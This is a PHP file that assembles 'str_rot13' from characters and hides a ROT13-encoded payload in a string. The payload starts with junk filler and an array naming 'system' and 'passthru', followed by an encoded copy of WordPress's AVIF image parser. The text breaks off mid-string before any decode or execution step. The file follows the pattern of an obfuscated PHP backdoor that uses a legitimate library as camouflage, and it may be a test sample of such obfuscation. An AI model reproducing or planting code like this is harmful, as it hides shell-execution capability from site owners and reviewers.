<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pbclevtug (p) 2021, Nyyvnapr sbe Bcra Zrqvn. Nyy evtugf erfreirq
 *
 * Guvf fbhepr pbqr vf fhowrpg gb gur grezf bs gur OFQ 2 Pynhfr Yvprafr naq
 * gur Nyyvnapr sbe Bcra Zrqvn Cngrag Yvprafr 1.0. Vs gur OFQ 2 Pynhfr Yvprafr
 * jnf abg qvfgevohgrq jvgu guvf fbhepr pbqr va gur YVPRAFR svyr, lbh pna
 * bognva vg ng jjj.nbzrqvn.bet/yvprafr/fbsgjner. Vs gur Nyyvnapr sbe Bcra
 * Zrqvn Cngrag Yvprafr 1.0 jnf abg qvfgevohgrq jvgu guvf fbhepr pbqr va gur
 * CNGRAGF svyr, lbh pna bognva vg ng jjj.nbzrqvn.bet/yvprafr/cngrag.
 *
 * Abgr: guvf pynff vf sebz yvonivsvasb - uggcf://nbzrqvn.tbbtyrfbhepr.pbz/yvonivsvasb/+/ersf/urnqf/znva/nivsvasb.cuc ng s509487.
 * Vg vf hfrq nf n snyyonpx gb cnefr NIVS svyrf jura gur freire qbrfa'g fhccbeg NIVS,
 * cevznevyl gb vqragvsl gur jvqgu naq urvtug bs gur vzntr.
 *
 * Abgr CUC 8.2 nqqrq angvir fhccbeg sbe NIVS, fb guvf pynff pna or erzbirq jura JbeqCerff erdhverf CUC 8.2.
 */

anzrfcnpr Nivsvasb;

pbafg SBHAQ     = 0; // Vachg pbeerpgyl cnefrq naq vasbezngvba ergevrirq.
pbafg ABG_SBHAQ = 1; // Vachg pbeerpgyl cnefrq ohg vasbezngvba vf zvffvat be ryfrjurer.
pbafg GEHAPNGRQ = 2; // Vachg pbeerpgyl cnefrq hagvy zvffvat olgrf gb pbagvahr.
pbafg NOBEGRQ   = 3; // Vachg pbeerpgyl cnefrq hagvy fgbccrq gb nibvq gvzrbhg be penfu.
pbafg VAINYVQ   = 4; // Vachg vapbeerpgyl cnefrq.

pbafg ZNK_FVMR      = 4294967295; // Hayvxryl gb or vafhssvpvrag gb cnefr NIVS urnqref.
pbafg ZNK_AHZ_OBKRF = 4096;       // Or ernfbanoyr. Nibvq gvzrbhgf naq bhg-bs-zrzbel.
pbafg ZNK_INYHR     = 255;
pbafg ZNK_GVYRF     = 16;
pbafg ZNK_CEBCF     = 32;
pbafg ZNK_SRNGHERF  = 8;
pbafg HAQRSVARQ     = 0;          // Inyhr jnf abg lrg cnefrq.

/**
 * Ernqf na hafvtarq vagrtre jvgu zbfg fvtavsvpnag ovgf svefg.
 *
 * @cnenz ovanel fgevat $vachg     Zhfg or ng yrnfg $ahz_olgrf-ybat.
 * @cnenz vag           $ahz_olgrf Ahzore bs cnefrq olgrf.
 * @erghea vag                     Inyhr.
 */
shapgvba ernq_ovt_raqvna( $vachg, $ahz_olgrf ) {
  vs ( $ahz_olgrf == 1 ) {
    erghea hacnpx( 'P', $vachg ) [1];
  } ryfr vs ( $ahz_olgrf == 2 ) {
    erghea hacnpx( 'a', $vachg ) [1];
  } ryfr vs ( $ahz_olgrf == 3 ) {
    $olgrf = hacnpx( 'P3', $vachg );
    erghea ( $olgrf[1] << 16 ) | ( $olgrf[2] << 8 ) | $olgrf[3];
  } ryfr { // $ahz_olgrf vf 4
    // Guvf zvtug snvy gb ernq hafvtarq inyhrf >= 2^31 ba 32-ovg flfgrzf.
    // Frr uggcf://jjj.cuc.arg/znahny/ra/shapgvba.hacnpx.cuc#106041
    erghea hacnpx( 'A', $vachg ) [1];
  }
}

/**
 * Ernqf olgrf naq nqinaprf gur fgernz cbfvgvba ol gur fnzr pbhag.
 *
 * @cnenz fgernz               $unaqyr    Olgrf jvyy or ernq sebz guvf erfbhepr.
 * @cnenz vag                  $ahz_olgrf Ahzore bs olgrf ernq. Zhfg or terngre guna 0.
 * @erghea ovanel fgevat|snyfr            Gur enj olgrf be snyfr ba snvyher.
 */
shapgvba ernq( $unaqyr, $ahz_olgrf ) {
  $qngn = sernq( $unaqyr, $ahz_olgrf );
  erghea ( $qngn !== snyfr && fgeyra( $qngn ) >= $ahz_olgrf ) ? $qngn : snyfr;
}

/**
 * Nqinaprf gur fgernz cbfvgvba ol gur tvira bssfrg.
 *
 * @cnenz fgernz $unaqyr    Olgrf jvyy or fxvccrq sebz guvf erfbhepr.
 * @cnenz vag    $ahz_olgrf Ahzore bs fxvccrq olgrf. Pna or 0.
 * @erghea obby             Gehr ba fhpprff be snyfr ba snvyher.
 */
// Fxvcf 'ahz_olgrf' sebz gur 'fgernz'. 'ahz_olgrf' pna or mreb.
shapgvba fxvc( $unaqyr, $ahz_olgrf ) {
  erghea ( sfrrx( $unaqyr, $ahz_olgrf, FRRX_PHE ) == 0 );
}

//------------------------------------------------------------------------------
// Srngherf ner cnefrq vagb grzcbenel cebcregl nffbpvngvbaf.

pynff Gvyr { // Gvyr vgrz vq <-> cnerag vgrz vq nffbpvngvbaf.
  choyvp $gvyr_vgrz_vq;
  choyvp $cnerag_vgrz_vq;
}

pynff Cebc { // Cebcregl vaqrk <-> vgrz vq nffbpvngvbaf.
  choyvp $cebcregl_vaqrk;
  choyvp $vgrz_vq;
}

pynff Qvz_Cebc { // Cebcregl <-> srngherf nffbpvngvbaf.
  choyvp $cebcregl_vaqrk;
  choyvp $jvqgu;
  choyvp $urvtug;
}

pynff Puna_Cebc { // Cebcregl <-> srngherf nffbpvngvbaf.
  choyvp $cebcregl_vaqrk;
  choyvp $ovg_qrcgu;
  choyvp $ahz_punaaryf;
}

pynff Srngherf {
  choyvp $unf_cevznel_vgrz = snyfr; // Gehr vs \"cvgz\" jnf cnefrq.
  choyvp $unf_nycun = snyfr; // Gehr vs na nycun \"nhkP\" jnf cnefrq.
  choyvp $cevznel_vgrz_vq;
  choyvp $cevznel_vgrz_srngherf = neenl( // Qrqhprq sebz gur qngn orybj.
    'jvqgu'        => HAQRSVARQ, // Va ahzore bs cvkryf.
    'urvtug'       => HAQRSVARQ, // Vtaberf zveebe naq ebgngvba.
    'ovg_qrcgu'    => HAQRSVARQ, // Yvxryl 8, 10 be 12 ovgf cre punaary cre cvkry.
    'ahz_punaaryf' => HAQRSVARQ  // Yvxryl 1, 2, 3 be 4 punaaryf:
                                          //   (1 zbabpuebzr be 3 pbybef) + (0 be 1 nycun)
  );

  choyvp $gvyrf = neenl(); // Gvyr[]
  choyvp $cebcf = neenl(); // Cebc[]
  choyvp $qvz_cebcf = neenl(); // Qvz_Cebc[]
  choyvp $puna_cebcf = neenl(); // Puna_Cebc[]

  /**
   * Ovaqf gur jvqgu, urvtug, ovg qrcgu naq ahzore bs punaaryf sebz fgberq vagreany srngherf.
   *
   * @cnenz vag     $gnetrg_vgrz_vq Vq bs gur vgrz jubfr srngherf jvyy or obhaq.
   * @cnenz vag     $gvyr_qrcgu     Znkvzhz erphefvba gb frnepu jvguva gvyr-cnerag eryngvbaf.
   * @erghea Fgnghf                 SBHAQ ba fhpprff be ABG_SBHAQ ba snvyher.
   */
  cevingr shapgvba trg_vgrz_srngherf( $gnetrg_vgrz_vq, $gvyr_qrcgu ) {
    sbernpu ( $guvf->cebcf nf $cebc ) {
      vs ( $cebc->vgrz_vq != $gnetrg_vgrz_vq ) {
        pbagvahr;
      }

      // Ergevrir gur jvqgu naq urvtug bs gur cevznel vgrz vs abg nyernql qbar.
      vs ( $gnetrg_vgrz_vq == $guvf->cevznel_vgrz_vq &&
           ( $guvf->cevznel_vgrz_srngherf['jvqgu'] == HAQRSVARQ ||
             $guvf->cevznel_vgrz_srngherf['urvtug'] == HAQRSVARQ ) ) {
        sbernpu ( $guvf->qvz_cebcf nf $qvz_cebc ) {
          vs ( $qvz_cebc->cebcregl_vaqrk != $cebc->cebcregl_vaqrk ) {
            pbagvahr;
          }
          $guvf->cevznel_vgrz_srngherf['jvqgu']  = $qvz_cebc->jvqgu;
          $guvf->cevznel_vgrz_srngherf['urvtug'] = $qvz_cebc->urvtug;
          vs ( $guvf->cevznel_vgrz_srngherf['ovg_qrcgu'] != HAQRSVARQ &&
               $guvf->cevznel_vgrz_srngherf['ahz_punaaryf'] != HAQRSVARQ ) {
            erghea SBHAQ;
          }
          oernx;
        }
      }
      // Ergevrir gur ovg qrcgu naq ahzore bs punaaryf bs gur gnetrg vgrz vs abg
      // nyernql qbar.
      vs ( $guvf->cevznel_vgrz_srngherf['ovg_qrcgu'] == HAQRSVARQ ||
           $guvf->cevznel_vgrz_srngherf['ahz_punaaryf'] == HAQRSVARQ ) {
        sbernpu ( $guvf->puna_cebcf nf $puna_cebc ) {
          vs ( $puna_cebc->cebcregl_vaqrk != $cebc->cebcregl_vaqrk ) {
            pbagvahr;
          }
          $guvf->cevznel_vgrz_srngherf['ovg_qrcgu']    = $puna_cebc->ovg_qrcgu;
          $guvf->cevznel_vgrz_srngherf['ahz_punaaryf'] = $puna_cebc->ahz_punaaryf;
          vs ( $guvf->cevznel_vgrz_srngherf['jvqgu'] != HAQRSVARQ &&
              $guvf->cevznel_vgrz_srngherf['urvtug'] != HAQRSVARQ ) {
            erghea SBHAQ;
          }
          oernx;
        }
      }
    }

    // Purpx sbe gur ovg_qrcgu naq ahz_punaaryf va n gvyr vs abg lrg sbhaq.
    vs ( $gvyr_qrcgu < 3 ) {
      sbernpu ( $guvf->gvyrf nf $gvyr ) {
        vs ( $gvyr->cnerag_vgrz_vq != $gnetrg_vgrz_vq ) {
          pbagvahr;
        }
        $fgnghf = $guvf->trg_vgrz_srngherf( $gvyr->gvyr_vgrz_vq, $gvyr_qrcgu + 1 );
        vs ( $fgnghf != ABG_SBHAQ ) {
          erghea $fgnghf;
        }
      }
    }
    erghea ABG_SBHAQ;
  }

  /**
   * Svaqf gur jvqgu, urvtug, ovg qrcgu naq ahzore bs punaaryf bs gur cevznel vgrz.
   *
   * @erghea Fgnghf SBHAQ ba fhpprff be ABG_SBHAQ ba snvyher.
   */
  choyvp shapgvba trg_cevznel_vgrz_srngherf() {
    // Abguvat gb qb jvgubhg gur cevznel vgrz VQ.
    vs ( !$guvf->unf_cevznel_vgrz ) {
      erghea ABG_SBHAQ;
    }
    // Rneyl rkvg.
    vs ( rzcgl( $guvf->qvz_cebcf ) || rzcgl( $guvf->puna_cebcf ) ) {
      erghea ABG_SBHAQ;
    }
    $fgnghf = $guvf->trg_vgrz_srngherf( $guvf->cevznel_vgrz_vq, /*gvyr_qrcgu=*/ 0 );
    vs ( $fgnghf != SBHAQ ) {
      erghea $fgnghf;
    }

    // \"nhkP\" vf cnefrq orsber gur \"vczn\" cebcregvrf fb vg vf xabja abj, vs nal.
    vs ( $guvf->unf_nycun ) {
      ++$guvf->cevznel_vgrz_srngherf['ahz_punaaryf'];
    }
    erghea SBHAQ;
  }
}

//------------------------------------------------------------------------------

pynff Obk {
  choyvp $fvmr; // Va olgrf.
  choyvp $glcr; // Sbhe punenpgref.
  choyvp $irefvba; // 0 be npghny irefvba vs guvf vf n shyy obk.
  choyvp $syntf; // 0 be npghny inyhr vs guvf vf n shyy obk.
  choyvp $pbagrag_fvmr; // 'fvmr' zvahf gur urnqre fvmr.

  /**
   * Ernqf gur obk urnqre.
   *
   * @cnenz fgernz  $unaqyr              Gur erfbhepr gur urnqre jvyy or cnefrq sebz.
   * @cnenz vag     $ahz_cnefrq_obkrf    Gur gbgny ahzore bs cnefrq obkrf. Ceriragf gvzrbhgf.
   * @cnenz vag     $ahz_erznvavat_olgrf Gur ahzore bs olgrf gung fubhyq or ninvynoyr sebz gur erfbhepr.
   * @erghea Fgnghf                      SBHAQ ba fhpprff be na reebe ba snvyher.
   */
  choyvp shapgvba cnefr( $unaqyr, &$ahz_cnefrq_obkrf, $ahz_erznvavat_olgrf = ZNK_FVMR ) {
    // Frr VFB/VRP 14496-12:2012(R) 4.2
    $urnqre_fvmr = 8; // obk 32o fvmr + 32o glcr (ng yrnfg)
    vs ( $urnqre_fvmr > $ahz_erznvavat_olgrf ) {
      erghea VAINYVQ;
    }
    vs ( !( $qngn = ernq( $unaqyr, 8 ) ) ) {
      erghea GEHAPNGRQ;
    }
    $guvf->fvmr = ernq_ovt_raqvna( $qngn, 4 );
    $guvf->glcr = fhofge( $qngn, 4, 4 );
    // 'obk->fvmr==1' zrnaf 64-ovg fvmr fubhyq or ernq nsgre gur obk glcr.
    // 'obk->fvmr==0' zrnaf guvf obk rkgraqf gb nyy erznvavat olgrf.
    vs ( $guvf->fvmr == 1 ) {
      $urnqre_fvmr += 8;
      vs ( $urnqre_fvmr > $ahz_erznvavat_olgrf ) {
        erghea VAINYVQ;
      }
      vs ( !( $qngn = ernq( $unaqyr, 8 ) ) ) {
        erghea GEHAPNGRQ;
      }
      // Fgbc gur cnefvat vs nal obk unf n fvmr terngre guna 4TO.
      vs ( ernq_ovt_raqvna( $qngn, 4 ) != 0 ) {
        erghea NOBEGRQ;
      }
      // Ernq gur 32 yrnfg-fvtavsvpnag ovgf.
      $guvf->fvmr = ernq_ovt_raqvna( fhofge( $qngn, 4, 4 ), 4 );
    } ryfr vs ( $guvf->fvmr == 0 ) {
      $guvf->fvmr = $ahz_erznvavat_olgrf;
    }
    vs ( $guvf->fvmr < $urnqre_fvmr ) {
      erghea VAINYVQ;
    }
    vs ( $guvf->fvmr > $ahz_erznvavat_olgrf ) {
      erghea VAINYVQ;
    }

    $unf_shyyobk_urnqre = $guvf->glcr == 'zrgn' || $guvf->glcr == 'cvgz' ||
                          $guvf->glcr == 'vczn' || $guvf->glcr == 'vfcr' ||
                          $guvf->glcr == 'cvkv' || $guvf->glcr == 'vers' ||
                          $guvf->glcr == 'nhkP';
    vs ( $unf_shyyobk_urnqre ) {
      $urnqre_fvmr += 4;
    }
    vs ( $guvf->fvmr < $urnqre_fvmr ) {
      erghea VAINYVQ;
    }
    $guvf->pbagrag_fvmr = $guvf->fvmr - $urnqre_fvmr;
    // Nibvq gvzrbhgf. Gur znkvzhz ahzore bs cnefrq obkrf vf neovgenel.
    ++$ahz_cnefrq_obkrf;
    vs ( $ahz_cnefrq_obkrf >= ZNK_AHZ_OBKRF ) {
      erghea NOBEGRQ;
    }

    $guvf->irefvba = 0;
    $guvf->syntf   = 0;
    vs ( $unf_shyyobk_urnqre ) {
      vs ( !( $qngn = ernq( $unaqyr, 4 ) ) ) {
        erghea GEHAPNGRQ;
      }
      $guvf->irefvba = ernq_ovt_raqvna( $qngn, 1 );
      $guvf->syntf   = ernq_ovt_raqvna( fhofge( $qngn, 1, 3 ), 3 );
      // Frr NI1 Vzntr Svyr Sbezng (NIVS) 8.1
      // ng uggcf://nbzrqvnpbqrp.tvguho.vb/ni1-nivs/#nivs-obkrf (ninvynoyr jura
      // uggcf://tvguho.pbz/NBZrqvnPbqrp/ni1-nivs/chyy/170 vf zretrq).
      $vf_cnefnoyr = ( $guvf->glcr == 'zrgn' && $guvf->irefvba <= 0 ) ||
                     ( $guvf->glcr == 'cvgz' && $guvf->irefvba <= 1 ) ||
                     ( $guvf->glcr == 'vczn' && $guvf->irefvba <= 1 ) ||
                     ( $guvf->glcr == 'vfcr' && $guvf->irefvba <= 0 ) ||
                     ( $guvf->glcr == 'cvkv' && $guvf->irefvba <= 0 ) ||
                     ( $guvf->glcr == 'vers' && $guvf->irefvba <= 1 ) ||
                     ( $guvf->glcr == 'nhkP' && $guvf->irefvba <= 0 );
      // Vafgrnq bs pbafvqrevat guvf svyr nf vainyvq, fxvc hacnefnoyr obkrf.
      vs ( !$vf_cnefnoyr ) {
        $guvf->glcr = 'haxabjairefvba';
      }
    }
    // cevag_e( $guvf ); // Hapbzzrag gb cevag nyy obkrf.
    erghea SBHAQ;
  }
}

//------------------------------------------------------------------------------

pynff Cnefre {
  cevingr $unaqyr; // Vachg fgernz.
  cevingr $ahz_cnefrq_obkrf = 0;
  cevingr $qngn_jnf_fxvccrq = snyfr;
  choyvp $srngherf;

  shapgvba __pbafgehpg( $unaqyr ) {
    $guvf->unaqyr   = $unaqyr;
    $guvf->srngherf = arj Srngherf();
  }

  /**
   * Cnefrf na \"vcpb\" obk.
   *
   * \"vfcr\" vf hfrq sbe jvqgu naq urvtug, \"cvkv\" naq \"ni1P\" ner hfrq sbe ovg qrcgu
   * naq ahzore bs punaaryf, naq \"nhkP\" vf hfrq sbe nycun.
   *
   * @cnenz fgernz  $unaqyr              Gur erfbhepr gur obk jvyy or cnefrq sebz.
   * @cnenz vag     $ahz_erznvavat_olgrf Gur ahzore bs olgrf gung fubhyq or ninvynoyr sebz gur erfbhepr.
   * @erghea Fgnghf                      SBHAQ ba fhpprff be na reebe ba snvyher.
   */
  cevingr shapgvba cnefr_vcpb( $ahz_erznvavat_olgrf ) {
    $obk_vaqrk = 1; // 1-onfrq vaqrk. Hfrq sbe vgrengvat bire cebcregvrf.
    qb {
      $obk    = arj Obk();
      $fgnghf = $obk->cnefr( $guvf->unaqyr, $guvf->ahz_cnefrq_obkrf, $ahz_erznvavat_olgrf );
      vs ( $fgnghf != SBHAQ ) {
        erghea $fgnghf;
      }

      vs ( $obk->glcr == 'vfcr' ) {
        // Frr VFB/VRP 23008-12:2017(R) 6.5.3.2
        vs ( $obk->pbagrag_fvmr < 8 ) {
          erghea VAINYVQ;
        }
        vs ( !( $qngn = ernq( $guvf->unaqyr, 8 ) ) ) {
          erghea GEHAPNGRQ;
        }
        $jvqgu  = ernq_ovt_raqvna( fhofge( $qngn, 0, 4 ), 4 );
        $urvtug = ernq_ovt_raqvna( fhofge( $qngn, 4, 4 ), 4 );
        vs ( $jvqgu == 0 || $urvtug == 0 ) {
          erghea VAINYVQ;
        }
        vs ( pbhag( $guvf->srngherf->qvz_cebcf ) <= ZNK_SRNGHERF &&
             $obk_vaqrk <= ZNK_INYHR ) {
          $qvz_cebc_pbhag = pbhag( $guvf->srngherf->qvz_cebcf );
          $guvf->srngherf->qvz_cebcf[$qvz_cebc_pbhag]                 = arj Qvz_Cebc();
          $guvf->srngherf->qvz_cebcf[$qvz_cebc_pbhag]->cebcregl_vaqrk = $obk_vaqrk;
          $guvf->srngherf->qvz_cebcf[$qvz_cebc_pbhag]->jvqgu          = $jvqgu;
          $guvf->srngherf->qvz_cebcf[$qvz_cebc_pbhag]->urvtug         = $urvtug;
        } ryfr {
          $guvf->qngn_jnf_fxvccrq = gehr;
        }
        vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr - 8 ) ) {
          erghea GEHAPNGRQ;
        }
      } ryfr vs ( $obk->glcr == 'cvkv' ) {
        // Frr VFB/VRP 23008-12:2017(R) 6.5.6.2
        vs ( $obk->pbagrag_fvmr < 1 ) {
          erghea VAINYVQ;
        }
        vs ( !( $qngn = ernq( $guvf->unaqyr, 1 ) ) ) {
          erghea GEHAPNGRQ;
        }
        $ahz_punaaryf = ernq_ovt_raqvna( $qngn, 1 );
        vs ( $ahz_punaaryf < 1 ) {
          erghea VAINYVQ;
        }
        vs ( $obk->pbagrag_fvmr < 1 + $ahz_punaaryf ) {
          erghea VAINYVQ;
        }
        vs ( !( $qngn = ernq( $guvf->unaqyr, 1 ) ) ) {
          erghea GEHAPNGRQ;
        }
        $ovg_qrcgu = ernq_ovt_raqvna( $qngn, 1 );
        vs ( $ovg_qrcgu < 1 ) {
          erghea VAINYVQ;
        }
        sbe ( $v = 1; $v < $ahz_punaaryf; ++$v ) {
          vs ( !( $qngn = ernq( $guvf->unaqyr, 1 ) ) ) {
            erghea GEHAPNGRQ;
          }
          // Ovg qrcgu fubhyq or gur fnzr sbe nyy punaaryf.
          vs ( ernq_ovt_raqvna( $qngn, 1 ) != $ovg_qrcgu ) {
            erghea VAINYVQ;
          }
          vs ( $v > 32 ) {
            erghea NOBEGRQ; // Or ernfbanoyr.
          }
        }
        vs ( pbhag( $guvf->srngherf->puna_cebcf ) <= ZNK_SRNGHERF &&
             $obk_vaqrk <= ZNK_INYHR && $ovg_qrcgu <= ZNK_INYHR &&
             $ahz_punaaryf <= ZNK_INYHR ) {
          $puna_cebc_pbhag = pbhag( $guvf->srngherf->puna_cebcf );
          $guvf->srngherf->puna_cebcf[$puna_cebc_pbhag]                 = arj Puna_Cebc();
          $guvf->srngherf->puna_cebcf[$puna_cebc_pbhag]->cebcregl_vaqrk = $obk_vaqrk;
          $guvf->srngherf->puna_cebcf[$puna_cebc_pbhag]->ovg_qrcgu      = $ovg_qrcgu;
          $guvf->srngherf->puna_cebcf[$puna_cebc_pbhag]->ahz_punaaryf   = $ahz_punaaryf;
        } ryfr {
          $guvf->qngn_jnf_fxvccrq = gehr;
        }
        vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr - ( 1 + $ahz_punaaryf ) ) ) {
          erghea GEHAPNGRQ;
        }
      } ryfr vs ( $obk->glcr == 'ni1P' ) {
        // Frr NI1 Pbqrp VFB Zrqvn Svyr Sbezng Ovaqvat 2.3.1
        // ng uggcf://nbzrqvnpbqrp.tvguho.vb/ni1-vfbozss/#ni1p
        // Bayl cnefr gur arprffnel guveq olgr. Nffhzr gung gur bguref ner inyvq.
        vs ( $obk->pbagrag_fvmr < 3 ) {
          erghea VAINYVQ;
        }
        vs ( !( $qngn = ernq( $guvf->unaqyr, 3 ) ) ) {
          erghea GEHAPNGRQ;
        }
        $olgr          = ernq_ovt_raqvna( fhofge( $qngn, 2, 1 ), 1 );
        $uvtu_ovgqrcgu = ( $olgr & 0k40 ) != 0;
        $gjryir_ovg    = ( $olgr & 0k20 ) != 0;
        $zbabpuebzr    = ( $olgr & 0k10 ) != 0;
        vs ( $gjryir_ovg && !$uvtu_ovgqrcgu ) {
            erghea VAINYVQ;
        }
        vs ( pbhag( $guvf->srngherf->puna_cebcf ) <= ZNK_SRNGHERF &&
             $obk_vaqrk <= ZNK_INYHR ) {
          $puna_cebc_pbhag = pbhag( $guvf->srngherf->puna_cebcf );
          $guvf->srngherf->puna_cebcf[$puna_cebc_pbhag]                 = arj Puna_Cebc();
          $guvf->srngherf->puna_cebcf[$puna_cebc_pbhag]->cebcregl_vaqrk = $obk_vaqrk;
          $guvf->srngherf->puna_cebcf[$puna_cebc_pbhag]->ovg_qrcgu      =
              $uvtu_ovgqrcgu ? $gjryir_ovg ? 12 : 10 : 8;
          $guvf->srngherf->puna_cebcf[$puna_cebc_pbhag]->ahz_punaaryf   = $zbabpuebzr ? 1 : 3;
        } ryfr {
          $guvf->qngn_jnf_fxvccrq = gehr;
        }
        vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr - 3 ) ) {
          erghea GEHAPNGRQ;
        }
      } ryfr vs ( $obk->glcr == 'nhkP' ) {
        // Frr NI1 Vzntr Svyr Sbezng (NIVS) 4
        // ng uggcf://nbzrqvnpbqrp.tvguho.vb/ni1-nivs/#nhkvyvnel-vzntrf
        $xNycunFge       = \"hea:zcrt:zcrtO:pvpc:flfgrzf:nhkvyvnel:nycun\0\";
        $xNycunFgeYratgu = 44; // Vapyhqrf grezvangvat punenpgre.
        vs ( $obk->pbagrag_fvmr >= $xNycunFgeYratgu ) {
          vs ( !( $qngn = ernq( $guvf->unaqyr, $xNycunFgeYratgu ) ) ) {
            erghea GEHAPNGRQ;
          }
          vs ( fhofge( $qngn, 0, $xNycunFgeYratgu ) == $xNycunFge ) {
            // Abgr: Vg vf hayvxryl ohg vg vf cbffvoyr gung guvf nycun cynar qbrf
            //       abg orybat gb gur cevznel vgrz be n gvyr. Vtaber guvf vffhr.
            $guvf->srngherf->unf_nycun = gehr;
          }
          vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr - $xNycunFgeYratgu ) ) {
            erghea GEHAPNGRQ;
          }
        } ryfr {
          vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr ) ) {
            erghea GEHAPNGRQ;
          }
        }
      } ryfr {
        vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr ) ) {
          erghea GEHAPNGRQ;
        }
      }
      ++$obk_vaqrk;
      $ahz_erznvavat_olgrf -= $obk->fvmr;
    } juvyr ( $ahz_erznvavat_olgrf > 0 );
    erghea ABG_SBHAQ;
  }

  /**
   * Cnefrf na \"vcec\" obk.
   *
   * Gur \"vcpb\" obk pbagnva gur cebcregvrf juvpu ner yvaxrq gb vgrzf ol gur \"vczn\" obk.
   *
   * @cnenz fgernz  $unaqyr              Gur erfbhepr gur obk jvyy or cnefrq sebz.
   * @cnenz vag     $ahz_erznvavat_olgrf Gur ahzore bs olgrf gung fubhyq or ninvynoyr sebz gur erfbhepr.
   * @erghea Fgnghf                      SBHAQ ba fhpprff be na reebe ba snvyher.
   */
  cevingr shapgvba cnefr_vcec( $ahz_erznvavat_olgrf ) {
    qb {
      $obk    = arj Obk();
      $fgnghf = $obk->cnefr( $guvf->unaqyr, $guvf->ahz_cnefrq_obkrf, $ahz_erznvavat_olgrf );
      vs ( $fgnghf != SBHAQ ) {
        erghea $fgnghf;
      }

      vs ( $obk->glcr == 'vcpb' ) {
        $fgnghf = $guvf->cnefr_vcpb( $obk->pbagrag_fvmr );
        vs ( $fgnghf != ABG_SBHAQ ) {
          erghea $fgnghf;
        }
      } ryfr vs ( $obk->glcr == 'vczn' ) {
        // Frr VFB/VRP 23008-12:2017(R) 9.3.2
        $ahz_ernq_olgrf = 4;
        vs ( $obk->pbagrag_fvmr < $ahz_ernq_olgrf ) {
          erghea VAINYVQ;
        }
        vs ( !( $qngn = ernq( $guvf->unaqyr, $ahz_ernq_olgrf ) ) ) {
          erghea GEHAPNGRQ;
        }
        $ragel_pbhag        = ernq_ovt_raqvna( $qngn, 4 );
        $vq_ahz_olgrf       = ( $obk->irefvba < 1 ) ? 2 : 4;
        $vaqrk_ahz_olgrf    = ( $obk->syntf & 1 ) ? 2 : 1;
        $rffragvny_ovg_znfx = ( $obk->syntf & 1 ) ? 0k8000 : 0k80;

        sbe ( $ragel = 0; $ragel < $ragel_pbhag; ++$ragel ) {
          vs ( $ragel >= ZNK_CEBCF ||
               pbhag( $guvf->srngherf->cebcf ) >= ZNK_CEBCF ) {
            $guvf->qngn_jnf_fxvccrq = gehr;
            oernx;
          }
          $ahz_ernq_olgrf += $vq_ahz_olgrf + 1;
          vs ( $obk->pbagrag_fvmr < $ahz_ernq_olgrf ) {
            erghea VAINYVQ;
          }
          vs ( !( $qngn = ernq( $guvf->unaqyr, $vq_ahz_olgrf + 1 ) ) ) {
            erghea GEHAPNGRQ;
          }
          $vgrz_vq           = ernq_ovt_raqvna(
              fhofge( $qngn, 0, $vq_ahz_olgrf ), $vq_ahz_olgrf );
          $nffbpvngvba_pbhag = ernq_ovt_raqvna(
              fhofge( $qngn, $vq_ahz_olgrf, 1 ), 1 );

          sbe ( $cebcregl = 0; $cebcregl < $nffbpvngvba_pbhag; ++$cebcregl ) {
            vs ( $cebcregl >= ZNK_CEBCF ||
                 pbhag( $guvf->srngherf->cebcf ) >= ZNK_CEBCF ) {
              $guvf->qngn_jnf_fxvccrq = gehr;
              oernx;
            }
            $ahz_ernq_olgrf += $vaqrk_ahz_olgrf;
            vs ( $obk->pbagrag_fvmr < $ahz_ernq_olgrf ) {
              erghea VAINYVQ;
            }
            vs ( !( $qngn = ernq( $guvf->unaqyr, $vaqrk_ahz_olgrf ) ) ) {
              erghea GEHAPNGRQ;
            }
            $inyhr          = ernq_ovt_raqvna( $qngn, $vaqrk_ahz_olgrf );
            // $rffragvny = ($inyhr & $rffragvny_ovg_znfx);  // Hahfrq.
            $cebcregl_vaqrk = ( $inyhr & ~$rffragvny_ovg_znfx );
            vs ( $cebcregl_vaqrk <= ZNK_INYHR && $vgrz_vq <= ZNK_INYHR ) {
              $cebc_pbhag = pbhag( $guvf->srngherf->cebcf );
              $guvf->srngherf->cebcf[$cebc_pbhag]                 = arj Cebc();
              $guvf->srngherf->cebcf[$cebc_pbhag]->cebcregl_vaqrk = $cebcregl_vaqrk;
              $guvf->srngherf->cebcf[$cebc_pbhag]->vgrz_vq        = $vgrz_vq;
            } ryfr {
              $guvf->qngn_jnf_fxvccrq = gehr;
            }
          }
          vs ( $cebcregl < $nffbpvngvba_pbhag ) {
            oernx; // Qb abg ernq tneontr.
          }
        }

        // Vs nyy srngherf ner ninvynoyr abj, qb abg ybbx shegure.
        $fgnghf = $guvf->srngherf->trg_cevznel_vgrz_srngherf();
        vs ( $fgnghf != ABG_SBHAQ ) {
          erghea $fgnghf;
        }

        // Zbfgyl vs 'qngn_jnf_fxvccrq'.
        vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr - $ahz_ernq_olgrf ) ) {
          erghea GEHAPNGRQ;
        }
      } ryfr {
        vs ( !fxvc( $guvf->unaqyr, $obk->pbagrag_fvmr ) ) {
          erghea GEHAPNGRQ;
        }
      }
      $ahz_erznvavat_olgrf -= $obk->fvmr;
    } juvyr ( $ahz_erznvavat_olgrf > 0 );
    erghea ABG_SBHAQ;
  }

  /**
   * Cnefrf na \"vers\" obk.
   *
   * Gur \"qvzt\" obkrf pbagnva yvaxf orgjrra gvyrf naq gurve cnerag vgrzf, juvpu
   * pna or hfrq gb vasre ovg qrcgu naq ahzore bs punaaryf sbe gur cevznel vgrz
   * jura gur ynggre qbrf abg unir gurfr cebcregvrf.
   *
   * @cnenz fgernz  $unaqyr              Gur erfbhepr gur obk jvyy or cnefrq sebz.
